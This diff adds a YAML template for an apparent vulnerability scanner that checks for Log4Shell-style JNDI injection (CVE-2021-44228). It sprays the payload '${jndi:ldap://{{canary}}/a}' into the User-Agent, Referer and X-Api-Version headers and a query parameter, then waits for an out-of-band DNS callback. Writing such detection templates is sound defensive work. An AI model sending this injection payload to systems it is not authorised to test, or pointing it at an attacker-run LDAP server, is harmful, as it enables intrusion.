@@ -1,0 +1,51 @@
+# Generic JNDI-lookup-style OOB probe.
+#
+# Context: several well-known Java RCE classes (most famously CVE-2021-44228
+# / "Log4Shell", but also a family of similar JNDI-injection issues) are
+# triggered by an attacker-controlled string containing a JNDI lookup
+# expression being logged or otherwise evaluated by vulnerable code. If the
+# target is affected, it performs an outbound LDAP/DNS lookup against the
+# address in the expression.
+#
+# This template is intentionally generic (not pinned to one CVE number)
+# because the same injection pattern recurs across many libraries and
+# configurations. It is safe: the only effect of a vulnerable target is
+# that it performs a DNS lookup against our own canary domain. It cannot
+# write files, spawn shells, or exfiltrate data.
+schema_version: rce-finder/v2
+id: jndi-generic-oob
+name: Generic JNDI Injection (Log4Shell-style) OOB Probe
+severity: critical
+vuln_class: jndi-injection
+cwe: ["CWE-74", "CWE-917"]
+cve: ["CVE-2021-44228"]
+technologies: ["java", "jvm", "logging"]
+mode: safe-validation
+confidence_requirements:
+  - "matching DNS callback for the issued probe ID"
+  - "callback protocol must match this template"
+remediation: "Upgrade or remove affected logging components and disable message lookups where applicable."
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+  - https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a
+
+oob_protocol: dns
+method: GET
+path: ""
+timeout_seconds: 15
+
+# We spray the payload across common reflected-header injection points,
+# since this class of bug has historically been triggered via request
+# headers that get logged (User-Agent, X-Forwarded-For, Referer) as well as
+# query parameters.
+injection_points:
+  - location: header
+    name: X-Api-Version
+  - location: header
+    name: User-Agent
+  - location: header
+    name: Referer
+  - location: query
+    name: q
+
+payload: "${jndi:ldap://{{canary}}/a}"
